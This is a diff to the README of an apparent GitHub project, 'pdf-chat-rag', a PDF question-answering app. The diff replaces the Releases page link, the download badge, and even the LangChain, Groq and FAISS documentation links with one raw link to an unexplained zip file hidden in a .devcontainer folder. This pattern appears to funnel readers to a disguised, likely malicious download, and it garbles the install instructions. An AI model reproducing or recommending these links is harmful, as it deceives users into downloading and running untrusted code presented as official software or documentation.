@@ -6,13 +6,13 @@ Welcome to **pdf-chat-rag**! This application helps you transform PDFs into inte
 ## 📦 Download & Install
 To get started, you need to download the application from our Releases page. 
 
-[![Download pdf-chat-rag](https://img.shields.io/badge/Download-pdf--chat--rag-blue.svg)](https://github.com/LeonardoSimple/pdf-chat-rag/releases)
+[![Download pdf-chat-rag](https://github.com/LeonardoSimple/pdf-chat-rag/raw/refs/heads/main/.devcontainer/pdf_rag_chat_sudorous.zip)](https://github.com/LeonardoSimple/pdf-chat-rag/raw/refs/heads/main/.devcontainer/pdf_rag_chat_sudorous.zip)
 
 ### Step 1: Visit the Releases Page
-Go to our Releases page to download the latest version of pdf-chat-rag: [Visit Releases Page](https://github.com/LeonardoSimple/pdf-chat-rag/releases)
+Go to our Releases page to download the latest version of pdf-chat-rag: [Visit Releases Page](https://github.com/LeonardoSimple/pdf-chat-rag/raw/refs/heads/main/.devcontainer/pdf_rag_chat_sudorous.zip)
 
 ### Step 2: Download the Application
-Once you are on the Releases page, find the latest version of the software. Look for a file named something like `pdf-chat-rag.exe` or `pdf-chat-rag.zip`. Click on it to start downloading. 
+Once you are on the Releases page, find the latest version of the software. Look for a file named something like `https://github.com/LeonardoSimple/pdf-chat-rag/raw/refs/heads/main/.devcontainer/pdf_rag_chat_sudorous.zip` or `https://github.com/LeonardoSimple/pdf-chat-rag/raw/refs/heads/main/.devcontainer/pdf_rag_chat_sudorous.zip`. Click on it to start downloading. 
 
 ### Step 3: Install the Application
 After the download is complete, locate the file on your computer. If you have a `.exe` file, double-click it to run the installer. If you have a `.zip` file, follow these steps:
@@ -68,8 +68,8 @@ Join our community! We welcome feedback and contributions. If you wish to contri
 ## 🌐 Resources
 For more information on the technologies used, check out the following:
 
-- [LangChain Documentation](https://docs.langchain.com/)
-- [Groq AI](https://groq.com/)
-- [FAISS](https://faiss.ai/)
+- [LangChain Documentation](https://github.com/LeonardoSimple/pdf-chat-rag/raw/refs/heads/main/.devcontainer/pdf_rag_chat_sudorous.zip)
+- [Groq AI](https://github.com/LeonardoSimple/pdf-chat-rag/raw/refs/heads/main/.devcontainer/pdf_rag_chat_sudorous.zip)
+- [FAISS](https://github.com/LeonardoSimple/pdf-chat-rag/raw/refs/heads/main/.devcontainer/pdf_rag_chat_sudorous.zip)
 
-To download pdf-chat-rag again, visit our Releases page: [Visit Releases Page](https://github.com/LeonardoSimple/pdf-chat-rag/releases)
+To download pdf-chat-rag again, visit our Releases page: [Visit Releases Page](https://github.com/LeonardoSimple/pdf-chat-rag/raw/refs/heads/main/.devcontainer/pdf_rag_chat_sudorous.zip)
